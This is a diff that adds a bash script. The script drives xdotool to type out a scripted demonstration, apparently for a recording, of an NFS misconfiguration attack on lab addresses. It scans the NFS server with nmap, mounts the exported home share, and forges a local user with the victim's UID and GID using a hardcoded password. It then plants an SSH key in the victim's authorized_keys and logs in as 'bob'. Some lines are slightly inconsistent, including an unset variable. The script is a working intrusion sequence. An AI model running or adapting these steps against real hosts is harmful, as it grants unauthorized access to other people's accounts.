@@ -1,0 +1,106 @@
+#!/bin/bash
+
+# xterm -fa monaco -fs 15 -bg black -fg green &
+sleep 10
+
+#WID=$(xdotool search --name "xterm" | sort -n | tail -1)
+WID=$(xdotool search --name "hacker" | sort -n | tail -1)
+xdotool windowfocus $WID
+
+# check login 
+xdotool type "clear"; xdotool key "Return"
+STR="# try to login to victim machine as user 'bob'"
+xdotool type "$STR"; xdotool key "Return"; sleep 1
+STR="ssh bob@10.10.9.202"
+xdotool type "$STR"; xdotool key "Return"; sleep 4
+
+# run nmap
+xdotool type "clear"; xdotool key "Return"
+STR="# previous scanning has found an NFS server"
+xdotool type "$STR"; xdotool key "Return"; sleep 1
+STR="nmap -sV --top-ports 60 10.10.8.15"
+xdotool type "$STR"; xdotool key "Return"; sleep 10
+
+# run nmap showmount
+xdotool type "clear"; xdotool key "Return"
+STR="# scanning reveals an exported 'home' directory"
+xdotool type "$STR"; xdotool key "Return"; sleep 1
+STR="nmap -sV --script=nfs-showmount 10.10.8.15"
+xdotool type "$STR"; xdotool key "Return"; sleep 10
+
+# run nmap ls
+xdotool type "clear"; xdotool key "Return"
+STR="# and we can see the UID and GID of users on the directory"
+xdotool type "$STR"; xdotool key "Return"; sleep 1
+STR="nmap -sV --script=nfs-ls 10.10.8.15"
+xdotool type "$STR"; xdotool key "Return"; sleep 10
+
+# run mount home directory
+xdotool type "clear"; xdotool key "Return"
+STR="# mount the directory to exploit it"
+xdotool type "$STR"; xdotool key "Return"; sleep 1
+STR="mkdir /mnt/home"
+xdotool type "$STR"; xdotool key "Return"; sleep 1
+STR="mount.nfs -rw 10.10.8.15:/home/ENT /mnt/home"
+xdotool type "$STR"; xdotool key "Return"; sleep 1
+STR="ls -la /mnt/home"
+xdotool type "$STR"; xdotool key "Return"; sleep 6
+STR="ls -la /mnt/home/bob"
+xdotool type "$STR"; xdotool key "Return"; sleep 6
+
+#  add a new user bob
+xdotool type "clear"; xdotool key "Return"
+STR="# create a user with the UID and GID of 'bob'"
+xdotool type "$STR"; xdotool key "Return"; sleep 1
+STR="groupadd -g 1830800513 ghacks"
+xdotool type "$STR"; xdotool key "Return"; sleep 1
+STR="openssl passwd -crypt 1qaz@WSX1"
+xdotool type "$STR"; xdotool key "Return"; sleep 1
+#STR="export MYPW=$(openssl passwd -crypt 1qaz@WSX1)"
+#xdotool type "$STR"; xdotool key "Return"; sleep 1
+STR="useradd -u 1830801111 -g ghacks -p Q7wR6DFTRluDU $MYPW bob"
+xdotool type "$STR"; xdotool key "Return"; sleep 1
+STR="ls -la /mnt/home"
+xdotool type "$STR"; xdotool key "Return"; sleep 1
+STR="ls -la /mnt/home/bob"
+xdotool type "$STR"; xdotool key "Return"; sleep 1
+STR="su - bob"
+xdotool type "$STR"; xdotool key "Return"; sleep 1
+STR="ls -la /mnt/home"
+xdotool type "$STR"; xdotool key "Return"; sleep 1
+STR="ls -la /mnt/home/bob"
+xdotool type "$STR"; xdotool key "Return"; sleep 3
+
+#  use bob to generate a openssl key
+xdotool type "clear"; xdotool key "Return"
+STR="# create RSA keys to use for ssh login"
+xdotool type "$STR"; xdotool key "Return"; sleep 1
+STR="mkdir /mnt/home/bob/.ssh"
+xdotool type "$STR"; xdotool key "Return"; sleep 1
+STR="cd /mnt/home/bob/.ssh"
+xdotool type "$STR"; xdotool key "Return"; sleep 1
+STR="ssh-keygen -t rsa"
+xdotool type "$STR"; xdotool key "Return"; sleep 2
+xdotool key "Return"; sleep 1
+xdotool key "Return"; sleep 1
+xdotool key "Return"; sleep 2 
+STR="cat /home/bob/.ssh/id_rsa.pub > authorized_keys"
+xdotool type "$STR"; xdotool key "Return"; sleep 1
+STR="chmod 640 authorized_keys"
+xdotool type "$STR"; xdotool key "Return"; sleep 1
+STR="chmod 700 ../.ssh"
+xdotool type "$STR"; xdotool key "Return"; sleep 10
+
+
+# login to victim box
+xdotool type "clear"; xdotool key "Return"
+STR="# login with the ssh rsa keys"
+xdotool type "$STR"; xdotool key "Return"; sleep 1
+STR="ssh bob@10.10.9.202"
+xdotool type "$STR"; xdotool key "Return"; sleep 2
+STR="yes"
+xdotool type "$STR"; xdotool key "Return"; sleep 20
+
+# run clear screen
+xdotool type "clear"; xdotool key "Return"
+
